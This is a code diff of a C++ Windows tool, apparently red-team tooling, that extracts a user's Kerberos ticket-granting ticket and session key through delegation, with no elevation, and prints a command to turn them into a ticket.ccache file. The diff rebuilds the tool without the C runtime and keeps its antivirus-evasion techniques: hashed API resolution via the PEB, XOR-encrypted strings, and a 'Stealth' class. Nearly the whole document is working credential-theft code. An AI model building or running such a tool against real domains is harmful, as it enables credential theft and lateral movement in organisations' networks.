@@ -1,20 +1,29 @@
 // Cross-session TGT extraction via Kerberos delegation
-// Runs as regular domain user, no elevation needed
+// No-CRT build: compiled with -nostartfiles, no C runtime dependency
 //
-// Compile: x86_64-w64-mingw32-g++ -O2 -s -static tgtdeleg.cpp -o tgtdeleg.exe
+// Compile: x86_64-w64-mingw32-g++ -O2 -nostartfiles ... -Wl,-e,TgtDelegEntry
 
 #define SECURITY_WIN32
 #include <windows.h>
 #include <sspi.h>
 #include <ntsecapi.h>
-#include <stdio.h>
 #include <stdint.h>
-#include <string.h>
-#include <string>
-#include <vector>
 #include <array>
 #include <utility>
-#include <cstddef>
+
+// --- No-CRT: provide memcpy/memset for compiler-generated calls ---
+extern "C" __attribute__((optimize("no-tree-loop-distribute-patterns")))
+void *memcpy(void *dst, const void *src, __SIZE_TYPE__ n) {
+    BYTE *d = (BYTE *)dst; const BYTE *s = (const BYTE *)src;
+    while (n--) *d++ = *s++;
+    return dst;
+}
+extern "C" __attribute__((optimize("no-tree-loop-distribute-patterns")))
+void *memset(void *dst, int c, __SIZE_TYPE__ n) {
+    BYTE *d = (BYTE *)dst;
+    while (n--) *d++ = (BYTE)c;
+    return dst;
+}
 
 // --- API Hashing Constants ---
 #define HASH_LoadLibraryA 0xbfad0e5f5fbff0fb
@@ -38,6 +47,12 @@
 #define HASH_LsaCallAuthenticationPackage 0x124b47e5abc4bb2d
 #define HASH_LsaFreeReturnBuffer 0x4dbfbbf6528ffd01
 #define HASH_LsaDeregisterLogonProcess 0x2af079e223961991
+
+// No-CRT output / entry
+#define HASH_GetStdHandle           0xbbf7e3a8f178843c
+#define HASH_WriteFile              0x0377b537663cecb0
+#define HASH_ExitProcess            0xbfd8ec92b769339e
+#define HASH_GetCommandLineA        0xbe1b2107b511fc4d
 
 // --- Typedefs ---
 typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
@@ -74,6 +89,12 @@ typedef NTSTATUS (WINAPI *pLsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, 
 typedef NTSTATUS (WINAPI *pLsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
 typedef NTSTATUS (WINAPI *pLsaFreeReturnBuffer)(PVOID);
 typedef NTSTATUS (WINAPI *pLsaDeregisterLogonProcess)(HANDLE);
+
+// No-CRT output / entry
+typedef HANDLE (WINAPI *pGetStdHandle_t)(DWORD);
+typedef BOOL (WINAPI *pWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef void (WINAPI *pExitProcess_t)(UINT);
+typedef LPSTR (WINAPI *pGetCommandLineA_t)(void);
 
 // --- Stealth Class ---
 typedef struct _PEB_LDR_DATA {
@@ -240,6 +261,19 @@ struct XorStr {
     char v[sizeof(str)]; \
     _crypt_##v.decrypt(v);
 
+// --- No-CRT inline string helpers ---
+static inline int nc_strlen(const char *s) { int n = 0; while (s[n]) n++; return n; }
+static inline int nc_wcslen(const WCHAR *s) { int n = 0; while (s[n]) n++; return n; }
+static inline int nc_strcmp(const char *a, const char *b) {
+    while (*a && *a == *b) { a++; b++; }
+    return (unsigned char)*a - (unsigned char)*b;
+}
+static inline void nc_strcpy(char *dst, const char *src) { while ((*dst++ = *src++)); }
+static inline void nc_strcat(char *dst, const char *src) {
+    while (*dst) dst++;
+    while ((*dst++ = *src++));
+}
+
 // --- Global Function Pointers ---
 pCloseHandle p_CloseHandle = NULL;
 pGetLastError p_GetLastError = NULL;
@@ -258,6 +292,13 @@ pLsaLookupAuthenticationPackage p_LsaLookupAuthenticationPackage = NULL;
 pLsaCallAuthenticationPackage p_LsaCallAuthenticationPackage = NULL;
 pLsaFreeReturnBuffer p_LsaFreeReturnBuffer = NULL;
 pLsaDeregisterLogonProcess p_LsaDeregisterLogonProcess = NULL;
+
+// No-CRT output
+static HANDLE g_hStdout = INVALID_HANDLE_VALUE;
+static HANDLE g_hStderr = INVALID_HANDLE_VALUE;
+static pWriteFile_t p_WriteFile = NULL;
+static pExitProcess_t p_ExitProcess = NULL;
+static pGetCommandLineA_t p_GetCommandLineA = NULL;
 
 BOOL InitAPIs() {
     DECRYPT(sK32, "kernel32.dll");
@@ -288,66 +329,104 @@ BOOL InitAPIs() {
     p_LsaFreeReturnBuffer = (pLsaFreeReturnBuffer)Stealth::GetProcAddressH(hSspi, HASH_LsaFreeReturnBuffer);
     p_LsaDeregisterLogonProcess = (pLsaDeregisterLogonProcess)Stealth::GetProcAddressH(hSspi, HASH_LsaDeregisterLogonProcess);
 
+    // No-CRT output APIs (kernel32)
+    pGetStdHandle_t p_GetStdHandle = (pGetStdHandle_t)Stealth::GetProcAddressH(hK32, HASH_GetStdHandle);
+    p_WriteFile = (pWriteFile_t)Stealth::GetProcAddressH(hK32, HASH_WriteFile);
+    p_ExitProcess = (pExitProcess_t)Stealth::GetProcAddressH(hK32, HASH_ExitProcess);
+    p_GetCommandLineA = (pGetCommandLineA_t)Stealth::GetProcAddressH(hK32, HASH_GetCommandLineA);
+
     if (!p_AcquireCredentialsHandleW || !p_InitializeSecurityContextW || !p_LsaConnectUntrusted || !p_GetEnvironmentVariableA) {
          return FALSE;
     }
+    if (!p_GetStdHandle || !p_WriteFile || !p_ExitProcess) {
+         return FALSE;
+    }
+
+    g_hStdout = p_GetStdHandle(STD_OUTPUT_HANDLE);
+    g_hStderr = p_GetStdHandle(STD_ERROR_HANDLE);
+
     return TRUE;
 }
 
-// --- Helper Functions ---
-void PrintHex(const unsigned char* data, size_t len, bool newline = true) {
-    for (size_t i = 0; i < len; ++i) {
-        printf("%02X", data[i]);
-    }
-    if (newline) printf("\n");
+// --- No-CRT output helpers ---
+static void OutWrite(const char *s, DWORD n) {
+    DWORD w; p_WriteFile(g_hStdout, s, n, &w, NULL);
+}
+static void OutStr(const char *s) { OutWrite(s, (DWORD)nc_strlen(s)); }
+static void ErrWrite(const char *s, DWORD n) {
+    DWORD w; p_WriteFile(g_hStderr, s, n, &w, NULL);
+}
+static void ErrStr(const char *s) { ErrWrite(s, (DWORD)nc_strlen(s)); }
+
+static void OutHexByte(unsigned char b) {
+    static const char hex[] = "0123456789ABCDEF";
+    char buf[2] = { hex[b >> 4], hex[b & 0xF] };
+    OutWrite(buf, 2);
 }
 
-std::string GetTargetSPN(const char* userTarget) {
+static void ErrHexDword(DWORD v) {
+    static const char hex[] = "0123456789ABCDEF";
+    char buf[10] = {'0','x'};
+    for (int i = 7; i >= 0; i--) { buf[9 - i] = hex[(v >> (i * 4)) & 0xF]; }
+    ErrWrite(buf, 10);
+}
+
+// --- Helper Functions ---
+void PrintHex(const unsigned char* data, int len, bool newline = true) {
+    for (int i = 0; i < len; ++i) {
+        OutHexByte(data[i]);
+    }
+    if (newline) OutStr("\n");
+}
+
+// Returns true on success; writes SPN into outBuf
+static bool GetTargetSPN(const char* userTarget, char* outBuf, int bufSize) {
     if (userTarget) {
-        return std::string(userTarget);
+        int i = 0;
+        while (userTarget[i] && i < bufSize - 1) { outBuf[i] = userTarget[i]; i++; }
+        outBuf[i] = 0;
+        return true;
     }
     
-    // Use environment variables to construct DC SPN
-    // LOGONSERVER = \\DCNAME (NetBIOS)
-    // USERDNSDOMAIN = domain.com
+    char logonServer[256];
+    char dnsDomain[256];
+    memset(logonServer, 0, sizeof(logonServer));
+    memset(dnsDomain, 0, sizeof(dnsDomain));
     
-    char logonServer[256] = {0};
-    char dnsDomain[256] = {0};
-    
-    // Get LOGONSERVER (e.g., "\\SENTINEL-LAB-DC")
     DECRYPT(sLogonServer, "LOGONSERVER");
     DWORD len = p_GetEnvironmentVariableA(sLogonServer, logonServer, sizeof(logonServer));
     if (len == 0 || len >= sizeof(logonServer)) {
-        fprintf(stderr, "[-] Failed to get env1\n");
-        return "";
+        ErrStr("[-] Failed to get env1\n");
+        return false;
     }
     
-    // Get USERDNSDOMAIN (e.g., "sentinel.lab")
     DECRYPT(sDnsDomain, "USERDNSDOMAIN");
     len = p_GetEnvironmentVariableA(sDnsDomain, dnsDomain, sizeof(dnsDomain));
     if (len == 0 || len >= sizeof(dnsDomain)) {
-        fprintf(stderr, "[-] Failed to get env2\n");
-        return "";
+        ErrStr("[-] Failed to get env2\n");
+        return false;
     }
     
     // Strip leading backslashes from LOGONSERVER
     const char* dcName = logonServer;
     while (*dcName == '\\') dcName++;
     
-    // Convert to lowercase for the FQDN
-    std::string dcLower;
-    for (const char* p = dcName; *p; ++p) {
-        dcLower += (*p >= 'A' && *p <= 'Z') ? (*p + 32) : *p;
+    // Build: HOST/<dcLowercase>.<dnsDomain>
+    nc_strcpy(outBuf, "HOST/");
+    int pos = 5;
+    for (const char* p = dcName; *p && pos < bufSize - 2; ++p) {
+        outBuf[pos++] = (*p >= 'A' && *p <= 'Z') ? (*p + 32) : *p;
     }
-    
-    // Construct FQDN: DCNAME.domain.com
-    std::string dcFqdn = dcLower + "." + std::string(dnsDomain);
-    
-    return "HOST/" + dcFqdn;
+    outBuf[pos++] = '.';
+    for (const char* p = dnsDomain; *p && pos < bufSize - 1; ++p) {
+        outBuf[pos++] = *p;
+    }
+    outBuf[pos] = 0;
+    return true;
 }
 
 // --- Core TGTDeleg Logic ---
-int RunTgtDeleg(const std::string& target) {
+int RunTgtDeleg(const char* target) {
     DECRYPT(pkgKerb, "Kerberos");
     
     // Convert package name to wide
@@ -368,7 +447,7 @@ int RunTgtDeleg(const std::string& target) {
     );
 
     if (status != SEC_E_OK) {
-        fprintf(stderr, "[-] Cred failed: 0x%08X\n", status);
+        ErrStr("[-] Cred failed: "); ErrHexDword(status); ErrStr("\n");
         return 1;
     }
 
@@ -380,7 +459,7 @@ int RunTgtDeleg(const std::string& target) {
     
     // Convert target to Wide
     WCHAR wTarget[512];
-    p_MultiByteToWideChar(CP_UTF8, 0, target.c_str(), -1, wTarget, 512);
+    p_MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 512);
 
     char buffer[16384];
     sbOut.BufferType = SECBUFFER_TOKEN;
@@ -410,36 +489,37 @@ int RunTgtDeleg(const std::string& target) {
     );
 
     if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
-        fprintf(stderr, "[-] ISC failed: 0x%08X\n", status);
+        ErrStr("[-] ISC failed: "); ErrHexDword(status); ErrStr("\n");
         return 1;
     }
     
     // === Step 3: Output extract_tgt command ===
-    printf("python3 other_tools/extract_tgt.py -req ");
+    OutStr("python3 other_tools/extract_tgt.py -req ");
     PrintHex((unsigned char*)sbOut.pvBuffer, sbOut.cbBuffer, false);
     
     // === Step 4: Connect to LSA (untrusted = no elevation needed) ===
     HANDLE hLsa;
     NTSTATUS ntStatus = p_LsaConnectUntrusted(&hLsa);
     if (ntStatus != 0) {
-        fprintf(stderr, "[-] Connect failed: 0x%08X\n", ntStatus);
+        ErrStr("[-] Connect failed: "); ErrHexDword(ntStatus); ErrStr("\n");
         return 1;
     }
     
     LSA_STRING name;
     name.Buffer = pkgKerb;
-    name.Length = strlen(pkgKerb);
+    name.Length = (USHORT)nc_strlen(pkgKerb);
     name.MaximumLength = name.Length + 1;
     
     ULONG authPkgId;
     ntStatus = p_LsaLookupAuthenticationPackage(hLsa, &name, &authPkgId);
     if (ntStatus != 0) {
-        fprintf(stderr, "[-] Lookup failed: 0x%08X\n", ntStatus);
+        ErrStr("[-] Lookup failed: "); ErrHexDword(ntStatus); ErrStr("\n");
         return 1;
     }
     
     // === Step 5: Retrieve Session Key ===
-    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(wTarget) * sizeof(WCHAR));
+    DWORD targetWideLen = (DWORD)nc_wcslen(wTarget);
+    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (targetWideLen * sizeof(WCHAR));
     BYTE requestBuffer[2048];
     PKERB_RETRIEVE_TKT_REQUEST pReq = (PKERB_RETRIEVE_TKT_REQUEST)requestBuffer;
     memset(requestBuffer, 0, reqSize);
@@ -447,7 +527,7 @@ int RunTgtDeleg(const std::string& target) {
     pReq->MessageType = KerbRetrieveEncodedTicketMessage; 
     pReq->CacheOptions = 0;
     pReq->EncryptionType = 0;
-    pReq->TargetName.Length = wcslen(wTarget) * sizeof(WCHAR);
+    pReq->TargetName.Length = (USHORT)(targetWideLen * sizeof(WCHAR));
     pReq->TargetName.MaximumLength = pReq->TargetName.Length;
     pReq->TargetName.Buffer = (PWSTR)(pReq + 1);
     memcpy(pReq->TargetName.Buffer, wTarget, pReq->TargetName.Length);
@@ -467,16 +547,17 @@ int RunTgtDeleg(const std::string& target) {
     );
     
     if (ntStatus != 0 || protocolStatus != 0) {
-        fprintf(stderr, "[-] Call failed. NT: 0x%08X, PS: 0x%08X\n", ntStatus, protocolStatus);
+        ErrStr("[-] Call failed. NT: "); ErrHexDword(ntStatus);
+        ErrStr(", PS: "); ErrHexDword(protocolStatus); ErrStr("\n");
     } else {
         PKERB_RETRIEVE_TKT_RESPONSE pResp = (PKERB_RETRIEVE_TKT_RESPONSE)pResponse;
         
         if (pResp && pResp->Ticket.SessionKey.Value) {
-            printf(" -key ");
+            OutStr(" -key ");
             PrintHex(pResp->Ticket.SessionKey.Value, pResp->Ticket.SessionKey.Length, false);
-            printf(" -out ticket.ccache\n");
+            OutStr(" -out ticket.ccache\n");
         } else {
-            fprintf(stderr, "[-] No Session Key in response.\n");
+            ErrStr("[-] No Session Key in response.\n");
         }
         
         if (pResponse) {
@@ -493,33 +574,79 @@ int RunTgtDeleg(const std::string& target) {
     return 0;
 }
 
-// --- Main ---
-int main(int argc, char* argv[]) {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    
+// --- No-CRT command line parser ---
+static const char* SkipArg(const char* cmd) {
+    if (*cmd == '"') { cmd++; while (*cmd && *cmd != '"') cmd++; if (*cmd) cmd++; }
+    else { while (*cmd && *cmd != ' ' && *cmd != '\t') cmd++; }
+    while (*cmd == ' ' || *cmd == '\t') cmd++;
+    return cmd;
+}
+
+// --- Entry Point (no CRT) ---
+extern "C" void TgtDelegEntry() {
     if (!InitAPIs()) {
-        fprintf(stderr, "[-] Init failed\n");
-        return 1;
+        // Can't use ErrStr yet if InitAPIs fails (no WriteFile resolved)
+        // Just exit silently
+        ExitProcess(1);
     }
 
-    const char* userTarget = nullptr;
-    
+    // Parse command line manually (no argc/argv from CRT)
+    const char* cmdLine = p_GetCommandLineA();
+    const char* userTarget = NULL;
+    char targetArgBuf[512];
+
     DECRYPT(flagT, "-t");
     
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], flagT) == 0 && i + 1 < argc) {
-            userTarget = argv[++i];
+    // Skip program name
+    const char* p = SkipArg(cmdLine);
+    while (*p) {
+        // Save start of this arg
+        const char* argStart = p;
+        const char* argEnd;
+        
+        // Find end of this arg
+        if (*p == '"') {
+            argStart = ++p;
+            while (*p && *p != '"') p++;
+            argEnd = p;
+            if (*p) p++;
+        } else {
+            while (*p && *p != ' ' && *p != '\t') p++;
+            argEnd = p;
+        }
+        while (*p == ' ' || *p == '\t') p++;
+        
+        // Check if this arg is "-t"
+        int argLen = (int)(argEnd - argStart);
+        if (argLen == 2 && argStart[0] == flagT[0] && argStart[1] == flagT[1]) {
+            // Next arg is the SPN
+            if (*p) {
+                const char* valStart = p;
+                if (*p == '"') {
+                    valStart = ++p;
+                    while (*p && *p != '"') p++;
+                } else {
+                    while (*p && *p != ' ' && *p != '\t') p++;
+                }
+                int valLen = (int)(p - valStart);
+                if (valLen > 0 && valLen < (int)sizeof(targetArgBuf)) {
+                    for (int i = 0; i < valLen; i++) targetArgBuf[i] = valStart[i];
+                    targetArgBuf[valLen] = 0;
+                    userTarget = targetArgBuf;
+                }
+                while (*p == ' ' || *p == '\t' || *p == '"') p++;
+            }
         }
     }
     
-    std::string target = GetTargetSPN(userTarget);
-    if (target.empty()) {
-        fprintf(stderr, "[-] No target. Use -t HOST/target.domain.com\n");
-        fprintf(stderr, "Usage: %s [-t HOST/target.domain.com]\n", argv[0]);
-        return 1;
+    char target[512];
+    if (!GetTargetSPN(userTarget, target, sizeof(target))) {
+        ErrStr("[-] No target. Use -t HOST/target.domain.com\n");
+        p_ExitProcess(1);
     }
     
-    fprintf(stderr, "[*] Target SPN: %s\n", target.c_str());
+    ErrStr("[*] Target SPN: "); ErrStr(target); ErrStr("\n");
     
-    return RunTgtDeleg(target);
+    int rc = RunTgtDeleg(target);
+    p_ExitProcess((UINT)rc);
 }
